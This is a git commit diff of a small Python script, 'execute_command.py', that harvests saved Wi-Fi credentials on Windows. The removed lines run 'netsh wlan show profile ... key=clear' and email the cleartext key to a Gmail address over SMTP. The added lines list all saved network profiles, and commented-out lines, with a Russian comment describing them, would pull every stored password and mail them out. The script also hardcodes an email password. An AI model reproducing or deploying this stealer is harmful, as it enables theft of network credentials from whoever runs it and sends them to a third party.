0e4bc7177f1b17105ee6e9894a64687e9d0ea7e9
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-07 18:26:37 +0700

    update

--- execute_command.py
+++ execute_command.py
@@ -1,4 +1,4 @@
-import subprocess, smtplib
+import subprocess, smtplib, re
 
 
 def send_mail(email, password, message):
@@ -9,6 +9,19 @@ def send_mail(email, password, message):
     server.quit()
 
 
-command = "netsh wlan show profile dn_city key=clear"
-result = subprocess.check_output(command, shell=True)
-send_mail("sereganazemcev@gmail.com", "22833720041917master", result)
+command = "netsh wlan show profile"
+networks = subprocess.check_output(command, shell=True)
+# network_names = re.search("(?:xa9 \s*:\s)(.*)", str(networks))
+net = networks.decode('cp866')
+network_names = re.findall("(?:пользователей \s*:\s)(.*)", net)
+# print(network_names)
+result = ""
+# если раскомментить все, что серое внизу, то по идее можнго получить пароли от всех сохраненных сетей
+# пока этот код просто выводит весь список сетей, можно вручную их загонять
+for net_name in network_names:
+    print(net_name)
+    #cmd = "netsh wlan show profile " + net_name + " key=clear"
+    #current_res = subprocess.check_output(cmd, shell=True)
+    #result = result + str(current_res)
+
+#send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
